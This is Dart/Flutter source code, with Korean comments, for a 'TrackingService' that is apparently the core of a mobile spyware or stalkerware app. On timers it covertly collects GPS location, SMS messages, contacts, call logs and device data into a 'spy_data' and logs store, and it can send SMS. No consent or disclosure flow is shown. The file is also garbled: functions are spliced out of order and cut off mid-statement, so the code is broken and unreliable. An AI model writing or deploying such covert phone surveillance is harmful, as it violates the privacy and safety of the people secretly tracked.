import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:call_log/call_log.dart';
import 'package:sms_advanced/sms_advanced.dart';

class TrackingService {
  static const MethodChannel _channel = MethodChannel('shadow_track');

  // 서비스 상태
  static bool _isTracking = false;
  static bool get isTracking => _isTracking;

  // 타이머들
  static Timer? _locationTimer;
  static Timer? _dataCollectionTimer;
  static Timer? _smsCollectionTimer;
  static Timer? _contactsCollectionTimer;

  // 수집 간격 (분)
  static const Map<String, int> collectionIntervals = {
    'location': 5,      // 5분마다 위치
    'data': 10,         // 10분마다 시스템 데이터
    'sms': 15,          // 15분마다 SMS
    'contacts': 30,     // 30분마다 연락처
  };

  /// 서비스 초기화
  static Future<void> initialize() async {
    try {
      // 네이티브 채널 초기화 시도
      await _channel.invokeMethod('initialize');
      print('TrackingService: Native channel initialized');
    } catch (e) {
      print('TrackingService: Native initialization failed: $e');
      // 오류 무시하고 계속 진행
    }
  }

  /// 추적 시작
  static Future<void> startTracking() async {
    if (_isTracking) return;

    try {
      print('TrackingService: 추적 서비스 시작 중...');

      // 권한 확인
      final hasPermissions = await _checkAndRequestPermissions();
      if (!hasPermissions) {
        print('TrackingService: 필수 권한 부족');
        throw Exception('필수 권한이 부족합니다');
      }

      _isTracking = true;

      // 네이티브 백그라운드 서비스 시작
      try {
        await _channel.invokeMethod('startBackgroundService');
        print('TrackingService: Native background service started');
      } catch (e) {
        print('TrackingService: Native service start failed: $e');
      }

      // Dart 레벨에서 추가 데이터 수집 시작
      _startLocationTracking();
      _startDataCollection();
      _startSMSCollection();
      _startContactsCollection();

      await _logEvent('TRACKING_STARTED', 'All monitoring services activated');
      print('TrackingService: 모든 추적 서비스가 성공적으로 시작됨');

    } catch (e) {
      print('TrackingService: Error starting tracking: $e');
      _isTracking = false;
      rethrow;
    }
  }

  /// 추적 중지
  static Future<void> stopTracking() async {
    if (!_isTracking) return;

    _isTracking = false;

    // 모든 타이머 중지
    _locationTimer?.cancel();
    _locationTimer = null;
    _dataCollectionTimer?.cancel();
    _dataCollectionTimer = null;
    _smsCollectionTimer?.cancel();
    _smsCollectionTimer = null;
    _contactsCollectionTimer?.cancel();
    _contactsCollectionTimer = null;

    // 네이티브 백그라운드 서비스 중지
    try {
      await _channel.invokeMethod('stopBackgroundService');
      print('TrackingService: Native background service stopped');
    } catch (e) {
      print('TrackingService: Native service stop failed: $e');
    }

    await _logEvent('TRACKING_STOPPED', 'All monitoring services deactivated');
    print('TrackingService: 모든 추적 서비스가 중지됨');
  }

  /// 권한 확인 및 요청
  static Future<bool> _checkAndRequestPermissions() async {
    try {
      final permissions = [
        Permission.location,
        Permission.locationAlways,
        Permission.sms,
        Permission.contacts,
        Permission.phone,
        Permission.storage,
      ];

      Map<Permission, PermissionStatus> statuses = await permissions.request();

      // 기본 권한이 하나라도 승인되면 계속 진행
      final hasBasicPermission = statuses.values.any(
              (status) => status == PermissionStatus.granted
      );

      if (!hasBasicPermission) {
        print('TrackingService: 기본 권한도 승인되지 않음');
        return false;
      }

      print('TrackingService: 권한 확인 완료');
      return true;
    } catch (e) {
      print('TrackingService: Permission check error: $e');
      return false;
    }
  }

  /// 위치 추적 시작
  static void _startLocationTracking() {
    _locationTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['location']!),
            (timer) async {
          try {
            await _collectLocationData();
          } catch (e) {
            print('TrackingService: Location collection error: $e');
          }
        }
    );

    // 즉시 한 번 실행
    _collectLocationData();
  }

  /// 위치 데이터 수집
  static Future<void> _collectLocationData() async {
    try {
      final permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied ||
          permission == LocationPermission.deniedForever) {
        print('TrackingService: Location permission not granted');
        return;
      }

      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        print('TrackingService: Location services are disabled');
        return;
      }

      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.medium,
        timeLimit: const Duration(seconds: 30),
      );

      final locationData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'speed': position.speed,
        'heading': position.heading,
        'timestamp': DateTime.now().toIso8601String(),
        'formatted_time': DateTime.now().toString(),
        'source': 'dart_geolocator',
      };

      await _saveDataToFile('location_data.json', locationData);
      print('TrackingService: Location collected: ${position.latitude}, ${position.longitude}');
    } catch (e) {
      await _logEvent('LOCATION_ERROR', 'Failed to get location: $e');
      print('TrackingService: Location collection error: $e');
    }
  }

  /// 데이터 수집 시작
  static void _startDataCollection() {
    _dataCollectionTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['data']!),
            (timer) async {
          try {
            await _collectSystemData();
          } catch (e) {
            print('TrackingService: Data collection error: $e');
          }
        }
    );

    // 즉시 한 번 실행
    _collectSystemData();
  }

  /// 시스템 데이터 수집
  static Future<void> _collectSystemData() async {
    try {
      // 네이티브 채널을 통한 디바이스 정보 수집
      try {
        final deviceInfo = await _channel.invokeMethod('getDeviceInfo');
        if (deviceInfo != null) {
          final data = Map<String, dynamic>.from(deviceInfo);
          data['source'] = 'native_channel';
          await _saveDataToFile('device_info.json', data);
        }

        // 배터리 레벨
        final batteryLevel = await _channel.invokeMethod('getBatteryLevel');
        if (batteryLevel != null) {
          final batteryData = {
            'battery_level': batteryLevel,
            'timestamp': DateTime.now().toIso8601String(),
            'source': 'dart_contacts_service',
          };

          await _saveDataToFile('contacts_data.json', contactData);
        }

        print('TrackingService: Contacts data collected via Dart: ${contacts.length} contacts');
      } catch (e) {
        print('TrackingService: Dart contacts collection failed: $e');
      }
    }

    /// 통화 기록 수집
    static Future<void> collectCallLogs() async {
      try {
        final permission = await Permission.phone.status;
        if (!permission.isGranted) {
          print('TrackingService: Phone permission not granted');
          return;
        }

        // 네이티브 채널을 통한 통화 기록 수집
        try {
          await _channel.invokeMethod('collectCallLogs');
          print('TrackingService: Call logs collection triggered via native');
        } catch (e) {
          print('TrackingService: Native call logs collection failed: $e');
          // Dart에서 통화 기록 수집 시도
          await _collectCallLogsViaDart();
        }

      } catch (e) {
        await _logEvent('CALL_LOGS_ERROR', 'Call logs collection failed: $e');
      }
    }

    /// Dart를 통한 통화 기록 수집
    static Future<void> _collectCallLogsViaDart() async {
      try {
        final entries = await CallLog.get();

        for (final entry in entries.take(50)) { // 최대 50개
          final callData = {
            'name': entry.name,
            'number': entry.number,
            'formatted_number': entry.formattedNumber,
            'call_type': entry.callType.toString(),
            'duration': entry.duration,
            'timestamp_date': entry.timestamp,
            'formatted_date': DateTime.fromMillisecondsSinceEpoch(entry.timestamp ?? 0).toIso8601String(),
            'cached_name': entry.cachedName,
            'cached_number_type': entry.cachedNumberType,
            'cached_number_label': entry.cachedNumberLabel,
            'sim_display_name': entry.simDisplayName,
            'phone_account_id': entry.phoneAccountId,
            'timestamp': DateTime.now().toIso8601String(),
            'source': 'dart_call_log',
          };

          await _saveDataToFile('call_logs.json', callData);
        }

        print('TrackingService: Call logs collected via Dart: ${entries.length} entries');
      } catch (e) {
        print('TrackingService: Dart call logs collection failed: $e');
      }
    }

    /// 기본 시스템 정보 수집
    static Future<void> _collectBasicSystemInfo() async {
      try {
        final systemData = {
          'platform': Platform.operatingSystem,
          'platform_version': Platform.operatingSystemVersion,
          'dart_version': Platform.version,
          'number_of_processors': Platform.numberOfProcessors,
          'locale': Platform.localeName,
          'timestamp': DateTime.now().toIso8601String(),
          'source': 'dart_platform',
        };

        await _saveDataToFile('system_info.json', systemData);
      } catch (e) {
        print('TrackingService: Basic system info collection failed: $e');
      }
    }

    /// SMS 전송
    static Future<void> sendSMS(String phoneNumber, String message) async {
      try {
        await _channel.invokeMethod('sendSMS', {
          'phoneNumber': phoneNumber,
          'message': message,
        });

        await _logEvent('SMS_SENT', 'SMS sent to $phoneNumber: $message');
        print('TrackingService: SMS sent successfully');
      } catch (e) {
        await _logEvent('SMS_SEND_ERROR', 'Failed to send SMS: $e');
        print('TrackingService: SMS send failed: $e');
        rethrow;
      }
    }

    /// 파일에 데이터 저장
    static Future<void> _saveDataToFile(String fileName, Map<String, dynamic> data) async {
      try {
        final directory = await getApplicationDocumentsDirectory();
        final logsDir = Directory('${directory.path}/logs');
        if (!await logsDir.exists()) {
          await logsDir.create(recursive: true);
        }

        final file = File('${logsDir.path}/$fileName');
        final jsonString = jsonEncode(data);
        await file.writeAsString('$jsonString\n', mode: FileMode.append);
      } catch (e) {
        print('TrackingService: File save error: $e');
      }
    }

    /// 이벤트 로깅
    static Future<void> _logEvent(String event, String details) async {
      final eventData = {
        'event': event,
        'details': details,
        'timestamp': DateTime.now().toIso8601String(),
        'service': 'TrackingService',
      };

      await _saveDataToFile('service_events.json', eventData);
    }

    /// 수집된 데이터 반환 (UI용)
    static Future<List<Map<String, dynamic>>> getCollectedData() async {
      try {
        final directory = await getApplicationDocumentsDirectory();
        final logsDir = Directory('${directory.path}/logs');

        if (!await logsDir.exists()) {
          return [];
        }

        final allData = <Map<String, dynamic>>[];
        final files = await logsDir.list().toList();

        for (final file in files) {
          if (file is File && file.path.endsWith('.json')) {
            try {
              final content = await file.readAsString();
              final lines = content.split('\n').where((line) => line.trim().isNotEmpty);

              for (final line in lines) {
                try {
                  final data = jsonDecode(line) as Map<String, dynamic>;
                  data['source_file'] = file.path.split('/').last;
                  allData.add(data);
                } catch (e) {
                  // JSON 파싱 오류 무시
                }
              }
            } catch (e) {
              // 파일 읽기 오류 무시
            }
          }
        }

        // 네이티브에서 수집된 데이터도 포함
        await _loadNativeCollectedData(allData);

        // 최신 순으로 정렬
        allData.sort((a, b) {
          final aTime = a['timestamp'] as String? ?? a['collected_at']?.toString() ?? '';
          final bTime = b['timestamp'] as String? ?? b['collected_at']?.toString() ?? '';
          return bTime.compareTo(aTime);
        });

        return allData;
      } catch (e) {
        print('TrackingService: Data retrieval error: $e');
        return [];
      }
    }

    /// 네이티브에서 수집된 데이터 로드
    static Future<void> _loadNativeCollectedData(List<Map<String, dynamic>> allData) async {
      try {
        final directory = await getApplicationDocumentsDirectory();
        final nativeDataDir = Directory('${directory.path}/spy_data');

        if (!await nativeDataDir.exists()) {
          return;
        }

        final files = await nativeDataDir.list().toList();

        for (final file in files) {
          if (file is File && file.path.endsWith('.json')) {
            try {
              final content = await file.readAsString();
              final lines = content.split('\n').where((line) => line.trim().isNotEmpty);

              for (final line in lines) {
                try {
                  final data = jsonDecode(line) as Map<String, dynamic>;
                  data['source_file'] = 'native_' + file.path.split('/').last;
                  data['source'] = 'native_android';
                  allData.add(data);
                } catch (e) {
                  // JSON 파싱 오류 무시
                }
              }
            } catch (e) {
              // 파일 읽기 오류 무시
            }
          }
        }
      } catch (e) {
        print('TrackingService: Native data loading error: $e');
      }
    }

    /// 특정 타입 데이터 반환
    static Future<List<Map<String, dynamic>>> getLocationData() async {
      final allData = await getCollectedData();
      return allData.where((data) =>
      data['source_file']?.toString().contains('location') == true ||
          data.containsKey('latitude') ||
          data.containsKey('provider')
      ).toList();
    }

    static Future<List<Map<String, dynamic>>> getSMSData() async {
      final allData = await getCollectedData();
      return allData.where((data) =>
      data['source_file']?.toString().contains('sms') == true ||
          data.containsKey('address') ||
          data.containsKey('body')
      ).toList();
    }

    static Future<List<Map<String, dynamic>>> getContactsData() async {
      final allData = await getCollectedData();
      return allData.where((data) =>
      data['source_file']?.toString().contains('contacts') == true ||
          data.containsKey('display_name') ||
          data.containsKey('name')
      ).toList();
    }

    static Future<List<Map<String, dynamic>>> getCallLogData() async {
      final allData = await getCollectedData();
      return allData.where((data) =>
      data['source_file']?.toString().contains('call') == true ||
          data.containsKey('call_type') ||
          data.containsKey('duration')
      ).toList();
    }

    /// 통계 정보
    static Future<Map<String, dynamic>> getCollectionStats() async {
      try {
        final locationData = await getLocationData();
        final smsData = await getSMSData();
        final contactsData = await getContactsData();
        final callLogData = await getCallLogData();

        final directory = await getApplicationDocumentsDirectory();
        final logsDir = Directory('${directory.path}/logs');
        final nativeDataDir = Directory('${directory.path}/spy_data');

        final stats = {
          'location_count': locationData.length,
          'sms_count': smsData.length,
          'contacts_count': contactsData.length,
          'call_log_count': callLogData.length,
          'total_log_files': 0,
          'total_data_files': 0,
          'last_update': DateTime.now().toIso8601String(),
          'event_count': 0,
        };

        // Dart 로그 파일 카운트
        if (await logsDir.exists()) {
          final dartFiles = await logsDir.list().toList();
          stats['total_log_files'] = (stats['total_log_files'] as int) + dartFiles.length;
          stats['total_data_files'] = (stats['total_data_files'] as int) +
              dartFiles.where((f) => f.path.endsWith('.json')).length;
        }

        // 네이티브 데이터 파일 카운트
        if (await nativeDataDir.exists()) {
          final nativeFiles = await nativeDataDir.list().toList();
          stats['total_log_files'] = (stats['total_log_files'] as int) + nativeFiles.length;
          stats['total_data_files'] = (stats['total_data_files'] as int) +
              nativeFiles.where((f) => f.path.endsWith('.json')).length;
        }

        // 이벤트 카운트
        final eventFile = File('${logsDir.path}/service_events.json');
        if (await eventFile.exists()) {
          final eventContent = await eventFile.readAsString();
          final eventLines = eventContent.split('\n').where((line) => line.trim().isNotEmpty);
          stats['event_count'] = eventLines.length;
        }

        return stats;
      } catch (e) {
        return {'error': 'Failed to get stats: $e'};
      }
    }

    /// 모든 데이터 삭제
    static Future<void> clearAllData() async {
      try {
        final directory = await getApplicationDocumentsDirectory();

        // Dart 로그 삭제
        final logsDir = Directory('${directory.path}/logs');
        if (await logsDir.exists()) {
          await logsDir.delete(recursive: true);
        }

        // 네이티브 데이터 삭제
        final nativeDataDir = Directory('${directory.path}/spy_data');
        if (await nativeDataDir.exists()) {
          await nativeDataDir.delete(recursive: true);
        }

        // 스크린샷 삭제
        final screenshotsDir = Directory('${directory.path}/screenshots');
        if (await screenshotsDir.exists()) {
          await screenshotsDir.delete(recursive: true);
        }

        await _logEvent('DATA_CLEARED', 'All monitoring data cleared');
        print('TrackingService: All data cleared successfully');
      } catch (e) {
        print('TrackingService: Clear data error: $e');
      }
    }

    /// 서비스 상태 정보
    static Map<String, dynamic> getServiceStatus() {
      return {
        'is_tracking': _isTracking,
        'location_timer_active': _locationTimer?.isActive ?? false,
        'data_timer_active': _dataCollectionTimer?.isActive ?? false,
        'sms_timer_active': _smsCollectionTimer?.isActive ?? false,
        'contacts_timer_active': _contactsCollectionTimer?.isActive ?? false,
        'collection_intervals': collectionIntervals,
        'last_status_check': DateTime.now().toIso8601String(),
      };
    }

    /// 강제 데이터 수집
    static Future<void> forceDataCollection() async {
      if (!_isTracking) {
        throw Exception('Tracking service is not active');
      }

      try {
        print('TrackingService: 강제 데이터 수집 시작');

        await Future.wait([
          _collectLocationData(),
          _collectSystemData(),
          _collectSMSData(),
          _collectContactsData(),
          collectCallLogs(),
        ]);

        await _logEvent('FORCE_COLLECTION', 'Manual data collection completed');
        print('TrackingService: 강제 데이터 수집 완료');
      } catch (e) {
        await _logEvent('FORCE_COLLECTION_ERROR', 'Manual collection failed: $e');
        print('TrackingService: 강제 데이터 수집 실패: $e');
        rethrow;
      }
    }

    /// 네이티브 서비스 상태 확인
    static Future<Map<String, dynamic>?> getNativeServiceStatus() async {
      try {
        final result = await _channel.invokeMethod('getServiceStatus');
        return result != null ? Map<String, dynamic>.from(result) : null;
      } catch (e) {
        print('TrackingService: Native service status check failed: $e');
        return null;
      }
    }

    /// 권한 상태 확인
    static Future<Map<String, dynamic>> getPermissionStatus() async {
      try {
        final result = await _channel.invokeMethod('checkPermissions');
        return result != null ? Map<String, dynamic>.from(result) : {};
      } catch (e) {
        print('TrackingService: Permission status check failed: $e');
        return {};
      }
    }
  }'native_channel',
};
await _saveDataToFile('battery_info.json', batteryData);
}

// 네트워크 타입
final networkType = await _channel.invokeMethod('getNetworkType');
if (networkType != null) {
final networkData = {
'network_type': networkType,
'timestamp': DateTime.now().toIso8601String(),
'source': 'native_channel',
};
await _saveDataToFile('network_info.json', networkData);
}

} catch (e) {
print('TrackingService: Native data collection failed: $e');
await _collectBasicSystemInfo();
}

print('TrackingService: System data collection completed');
} catch (e) {
await _logEvent('DATA_COLLECTION_ERROR', 'System data collection failed: $e');
}
}

/// SMS 수집 시작
static void _startSMSCollection() {
_smsCollectionTimer = Timer.periodic(
Duration(minutes: collectionIntervals['sms']!),
(timer) async {
try {
await _collectSMSData();
} catch (e) {
print('TrackingService: SMS collection error: $e');
}
}
);

// 즉시 한 번 실행
_collectSMSData();
}

/// SMS 데이터 수집
static Future<void> _collectSMSData() async {
try {
final permission = await Permission.sms.status;
if (!permission.isGranted) {
print('TrackingService: SMS permission not granted');
return;
}

// 네이티브 채널을 통한 SMS 수집
try {
await _channel.invokeMethod('collectSMS');
print('TrackingService: SMS collection triggered via native');
} catch (e) {
print('TrackingService: Native SMS collection failed: $e');
// Dart에서 SMS 수집 시도
await _collectSMSViaDart();
}

} catch (e) {
await _logEvent('SMS_COLLECTION_ERROR', 'SMS collection failed: $e');
}
}

/// Dart를 통한 SMS 수집
static Future<void> _collectSMSViaDart() async {
try {
SmsQuery query = SmsQuery();
List<SmsMessage> messages = await query.querySms(
kinds: [SmsQueryKind.inbox, SmsQueryKind.sent],
count: 50,
);

final smsData = messages.map((msg) => {
'address': msg.address,
'body': msg.body,
'date': msg.date?.toIso8601String(),
'kind': msg.kind.toString(),
'timestamp': DateTime.now().toIso8601String(),
'source': 'dart_sms_advanced',
}).toList();

for (final sms in smsData) {
await _saveDataToFile('sms_data.json', sms);
}

print('TrackingService: SMS data collected via Dart: ${smsData.length} messages');
} catch (e) {
print('TrackingService: Dart SMS collection failed: $e');
}
}

/// 연락처 수집 시작
static void _startContactsCollection() {
_contactsCollectionTimer = Timer.periodic(
Duration(minutes: collectionIntervals['contacts']!),
(timer) async {
try {
await _collectContactsData();
} catch (e) {
print('TrackingService: Contacts collection error: $e');
}
}
);

// 즉시 한 번 실행
_collectContactsData();
}

/// 연락처 데이터 수집
static Future<void> _collectContactsData() async {
try {
final permission = await Permission.contacts.status;
if (!permission.isGranted) {
print('TrackingService: Contacts permission not granted');
return;
}

// 네이티브 채널을 통한 연락처 수집
try {
await _channel.invokeMethod('collectContacts');
print('TrackingService: Contacts collection triggered via native');
} catch (e) {
print('TrackingService: Native contacts collection failed: $e');
// Dart에서 연락처 수집 시도
await _collectContactsViaDart();
}

} catch (e) {
await _logEvent('CONTACTS_COLLECTION_ERROR', 'Contacts collection failed: $e');
}
}

/// Dart를 통한 연락처 수집
static Future<void> _collectContactsViaDart() async {
try {
final contacts = await ContactsService.getContacts();

for (final contact in contacts.take(100)) { // 최대 100개
final contactData = {
'display_name': contact.displayName,
'given_name': contact.givenName,
'family_name': contact.familyName,
'phones': contact.phones?.map((p) => {
'value': p.value,
'label': p.label,
}).toList(),
'emails': contact.emails?.map((e) => {
'value': e.value,
'label': e.label,
}).toList(),
'timestamp': DateTime.now().toIso8601String(),
'source':